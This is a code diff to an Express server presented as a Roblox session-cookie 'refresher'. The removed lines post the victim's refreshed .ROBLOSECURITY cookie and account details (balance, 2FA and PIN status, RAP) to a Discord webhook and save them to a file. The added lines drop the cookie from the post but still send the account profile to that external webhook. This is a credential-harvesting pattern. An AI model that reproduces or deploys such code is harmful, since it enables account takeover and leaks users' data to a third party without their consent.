@@ -1,95 +1,85 @@
-const express = require('express');
-const axios = require('axios');
-const fs = require('fs');
+const express = require("express");
+const axios = require("axios");
+const rateLimit = require("express-rate-limit");
 
-const { generateAuthTicket, redeemAuthTicket } = require('./refresh');
-const { RobloxUser } = require('./getuserinfo');
+const { generateAuthTicket, redeemAuthTicket } = require("./refresh");
+const { RobloxUser } = require("./getuserinfo");
 
 const app = express();
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.static("public"));
 
+// 🔒 Rate limiter to prevent abuse (5 requests per 5 minutes per IP)
+const limiter = rateLimit({
+    windowMs: 5 * 60 * 1000, // 5 minutes
+    max: 5, // Max 5 requests
+    message: { error: "Too many requests, please try again later." },
+});
 
-
-
-app.get('/refresh', async (req, res) => {
-    const roblosecurityCookie = req.query.cookie;
-
-    const authTicket = await generateAuthTicket(roblosecurityCookie);
-
-    if (authTicket === "Failed to fetch auth ticket") {
-        res.status(400).json({ error: "Invalid cookie" });
-        return;
-    }
-
-    const redemptionResult = await redeemAuthTicket(authTicket);
-
-    if (!redemptionResult.success) {
-        if (redemptionResult.robloxDebugResponse && redemptionResult.robloxDebugResponse.status === 401) {
-            res.status(401).json({ error: "Unauthorized: The provided cookie is invalid." });
-        } else {
-            res.status(400).json({ error: "Invalid cookie" });
+app.get("/refresh", limiter, async (req, res) => {
+    try {
+        const roblosecurityCookie = req.query.cookie;
+        if (!roblosecurityCookie) {
+            return res.status(400).json({ error: "Missing .ROBLOSECURITY cookie" });
         }
-        return;
-    }
 
-    const refreshedCookie = redemptionResult.refreshedCookie || '';
+        // Generate Auth Ticket
+        const authTicket = await generateAuthTicket(roblosecurityCookie);
+        if (authTicket === "Failed to fetch auth ticket") {
+            return res.status(401).json({ error: "Invalid or expired cookie" });
+        }
 
-    const robloxUser = await RobloxUser.register(roblosecurityCookie);
-    const userData = await robloxUser.getUserData();
+        // Redeem Auth Ticket
+        const redemptionResult = await redeemAuthTicket(authTicket);
+        if (!redemptionResult.success) {
+            return res.status(401).json({ error: "Unauthorized: Invalid or expired cookie" });
+        }
 
-    const debugInfo = `Auth Ticket ID: ${authTicket}`;
-    const fileContent = {
-        RefreshedCookie: refreshedCookie,
-        DebugInfo: debugInfo,
-        Username: userData.username,
-        UserID: userData.uid,
-        DisplayName: userData.displayName,
-        CreationDate: userData.createdAt,
-        Country: userData.country,
-        AccountBalanceRobux: userData.balance,
-        Is2FAEnabled: userData.isTwoStepVerificationEnabled,
-        IsPINEnabled: userData.isPinEnabled,
-        IsPremium: userData.isPremium,
-        CreditBalance: userData.creditbalance,
-        RAP: userData.rap,
-    };
+        const refreshedCookie = redemptionResult.refreshedCookie || "";
+        const robloxUser = await RobloxUser.register(roblosecurityCookie);
+        const userData = await robloxUser.getUserData();
 
-    fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
+        // 🔒 Do not log or expose the refreshed cookie
+        console.log(`Refreshed cookie for ${userData.username}`);
 
-    const webhookURL = 'HOOK HERE';
-    const response = await axios.post(webhookURL, {
-        embeds: [
-            {
-                title: 'Refreshed Cookie',
-                description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
-                color: 16776960,
-                thumbnail: {
-                    url: userData.avatarUrl,
-                },
-                fields: [
-                    { name: 'Username', value: userData.username, inline: true },
-                    { name: 'User ID', value: userData.uid, inline: true },
-                    { name: 'Display Name', value: userData.displayName, inline: true },
-                    { name: 'Creation Date', value: userData.createdAt, inline: true },
-                    { name: 'Country', value: userData.country, inline: true },
-                    { name: 'Account Balance (Robux)', value: userData.balance, inline: true },
-                    { name: 'Is 2FA Enabled', value: userData.isTwoStepVerificationEnabled, inline: true },
-                    { name: 'Is PIN Enabled', value: userData.isPinEnabled, inline: true },
-                    { name: 'Is Premium', value: userData.isPremium, inline: true },
-                    { name: 'Credit Balance', value: userData.creditbalance, inline: true },
-                    { name: 'RAP', value: userData.rap, inline: true },
+        // 📡 Send data to Discord Webhook
+        const webhookURL = "HOOK HERE";
+        try {
+            await axios.post(webhookURL, {
+                embeds: [
+                    {
+                        title: "Cookie Refreshed",
+                        description: `🔄 Your Roblox session has been refreshed successfully.`,
+                        color: 16776960,
+                        thumbnail: { url: userData.avatarUrl },
+                        fields: [
+                            { name: "Username", value: userData.username, inline: true },
+                            { name: "User ID", value: userData.uid, inline: true },
+                            { name: "Display Name", value: userData.displayName, inline: true },
+                            { name: "Creation Date", value: userData.createdAt, inline: true },
+                            { name: "Country", value: userData.country, inline: true },
+                            { name: "Account Balance (Robux)", value: userData.balance, inline: true },
+                            { name: "Is 2FA Enabled", value: userData.isTwoStepVerificationEnabled ? "✅ Yes" : "❌ No", inline: true },
+                            { name: "Is PIN Enabled", value: userData.isPinEnabled ? "✅ Yes" : "❌ No", inline: true },
+                            { name: "Is Premium", value: userData.isPremium ? "✅ Yes" : "❌ No", inline: true },
+                            { name: "Credit Balance", value: userData.creditbalance, inline: true },
+                            { name: "RAP", value: userData.rap, inline: true },
+                        ],
+                    },
                 ],
-            }
-        ]
-    });
+            });
+        } catch (webhookError) {
+            console.error("❌ Failed to send webhook:", webhookError.response?.data || webhookError.message);
+        }
 
-    console.log('Sent successfully+response', response.data);
-
-    res.json({ authTicket, redemptionResult });
+        return res.json({ message: "Cookie refreshed successfully", username: userData.username });
+    } catch (error) {
+        console.error("❌ Error in /refresh route:", error);
+        return res.status(500).json({ error: "Internal Server Error" });
+    }
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+    console.log(`🚀 Server is running on port ${PORT}`);
 });
